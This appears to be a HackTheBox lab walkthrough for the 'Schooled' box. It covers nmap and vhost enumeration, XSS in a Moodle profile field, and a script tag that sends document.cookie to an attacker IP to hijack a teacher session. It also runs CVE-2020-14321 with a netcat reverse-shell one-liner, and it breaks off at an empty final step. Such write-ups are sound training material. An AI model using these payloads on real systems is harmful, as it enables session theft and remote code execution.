1. Connect the box, get IP.
2. Run nmap:
    ```bash
    nmap -Pn -A 10.10.10.234
    ```
    ![](/HackTheBox/images/schooled1.png)
3. In the bottom of site, we see 'schooled.htb', add that to /etc/hosts.
    ![](/HackTheBox/images/schooled2.png)
4. Run gobuster vhost for subdomain search:
    ```bash
    gobuster vhost -u schooled.htb -w /root/tools/dnscan/subdomains-500.txt -z -t 100 
    ```
    ![](/HackTheBox/images/schooled3.png)
    Found moodle.schooled.htb, add that to /etc/hosts.
5. Open moodle.schooled.htb.
6. Create account, login, join Mathematics course, check Announcements.
    ![](/HackTheBox/images/schooled4.png)
7. Go to Edit profile, see the MoodleNet field.
    Type in 
    ```html
    "><h1>test</h1>
    ```
    and Update profile, you see this:
    ![](/HackTheBox/images/schooled5.png)
    Hence, the site has XSS (Cross-Site Scripting)
8. Run python server on your machine:
    ```bash
    python3 -m http.server 4443
    ```
9. Type this in MoodleNet area:
    ```html
    <script>new Image().src="http://10.10.14.7:4443?c="+document.cookie;</script>
    ```
    Wait for a while.
10. Teacher's cookie comes in the python server. Replace that and you are the teacher now.
    ![](/HackTheBox/images/schooled6.png)
    ![](/HackTheBox/images/schooled7.png)
11. Use this CVE: [CVE-2020-14321](https://github.com/lanzt/CVE-2020-14321).  
    Run nc server:
    ```bash
    nc -lnvp 1234
    ```
    Run this command:
    ```bash
    python3 CVE-2020-14321_RCE.py http://moodle.schooled.htb/moodle/ --cookie b2vg6doaecljo3tdro0apnbht2 --cdomain moodle.schooled.htb --cpath '/moodle/' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 1234 >/tmp/f'
    ```
    We get reverse shell:
    ![](/HackTheBox/images/schooled8.png)
12. Use nc to transfer FreeBSD socat and stabilize shell.
13. 

